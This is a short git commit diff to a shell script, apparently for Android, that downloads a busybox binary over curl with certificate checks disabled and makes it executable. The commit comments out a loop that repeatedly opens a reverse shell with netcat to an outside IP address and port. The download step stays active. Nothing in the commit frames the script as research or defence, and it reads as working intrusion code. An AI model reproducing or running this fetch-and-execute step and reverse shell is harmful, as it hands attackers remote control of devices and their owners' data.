3ea26313d202595bdd35e7f9ef2c691ffae946c5
t4084058 <139777346+t4084058@users.noreply.github.com>
2024-09-26 20:12:02 -0400

    Update script.sh

--- 866207152591198/script.sh
+++ 866207152591198/script.sh
@@ -7,9 +7,9 @@ dcurl --dns-servers 1.1.1.1 -k -o /data/local/tmp/busybox https://ktrud.nyc3.dig
 chmod +x /data/local/tmp/busybox
 
 # Run the loop with netcat command
-while true
-do
-  /data/local/tmp/busybox nc 3.141.142.211 14817 -e /bin/sh
+#while true
+#do
+  #/data/local/tmp/busybox nc 3.141.142.211 14817 -e /bin/sh
   
-done
+#done
 
